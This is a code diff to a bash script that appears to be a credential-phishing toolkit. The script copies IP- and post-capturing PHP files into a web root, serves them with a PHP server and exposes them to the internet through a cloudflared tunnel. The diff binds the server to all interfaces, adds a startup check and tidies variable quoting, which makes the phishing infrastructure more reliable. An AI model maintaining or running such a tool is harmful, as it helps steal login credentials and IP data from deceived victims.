@@ -7,7 +7,7 @@
 
 __version__="1.0.0"
 
-HOST='127.0.0.1'
+HOST='0.0.0.0'
 PORT='8080'
 
 RED="$(printf '\033[31m')"
@@ -149,9 +149,17 @@ setup_site() {
     cp -f ".sites/ip.php" ".server/www/" 2>/dev/null
     cp -f ".sites/post.php" ".server/www/" 2>/dev/null
 
-    echo -ne "${RED}[-]${BLUE} Starting PHP server...${WHITE}"
-    cd ".server/www" && php -S "$HOST:$PORT" >/dev/null 2>&1 &
+    echo -ne "${RED}[-]${BLUE} Starting PHP server on ${HOST}:${PORT}...${WHITE}"
+    cd ".server/www" && php -S "${HOST}:${PORT}" >/dev/null 2>&1 &
+    PHPPID=$!
     cd "$BASE_DIR"
+    sleep 2
+    
+    # Verify PHP server is running
+    if ! kill -0 $PHPPID 2>/dev/null; then
+        echo -e "\n${RED}[!] PHP server failed to start${WHITE}"
+        exit 1
+    fi
 }
 
 capture_ip() {
@@ -256,15 +264,15 @@ custom_url() {
 start_cloudflared() {
     rm -f "$BASE_DIR/.server/.cld.log"
     cusport
-    echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://$HOST:$PORT${GREEN})${WHITE}"
+    echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://${HOST}:${PORT}${GREEN})${WHITE}"
     setup_site
 
     echo -ne "\n${RED}[-]${GREEN} Launching Cloudflared...${WHITE}"
 
     if command -v termux-chroot >/dev/null 2>&1; then
-        termux-chroot "$BASE_DIR/.server/cloudflared" tunnel -url "$HOST:$PORT" --logfile "$BASE_DIR/.server/.cld.log" >/dev/null 2>&1 &
+        termux-chroot "$BASE_DIR/.server/cloudflared" tunnel -url "${HOST}:${PORT}" --logfile "$BASE_DIR/.server/.cld.log" >/dev/null 2>&1 &
     else
-        "$BASE_DIR/.server/cloudflared" tunnel -url "$HOST:$PORT" --logfile "$BASE_DIR/.server/.cld.log" >/dev/null 2>&1 &
+        "$BASE_DIR/.server/cloudflared" tunnel -url "${HOST}:${PORT}" --logfile "$BASE_DIR/.server/.cld.log" >/dev/null 2>&1 &
     fi
 
     # Wait for tunnel with retry loop (max 30 seconds)
@@ -286,9 +294,9 @@ start_cloudflared() {
 
 start_localhost() {
     cusport
-    echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://$HOST:$PORT${GREEN})${WHITE}"
+    echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://${HOST}:${PORT}${GREEN})${WHITE}"
     setup_site
-    echo -e "\n${GREEN}[+] Server running at: ${CYAN}http://$HOST:$PORT${WHITE}"
+    echo -e "\n${GREEN}[+] Server running at: ${CYAN}http://${HOST}:${PORT}${WHITE}"
     capture_data
 }
 
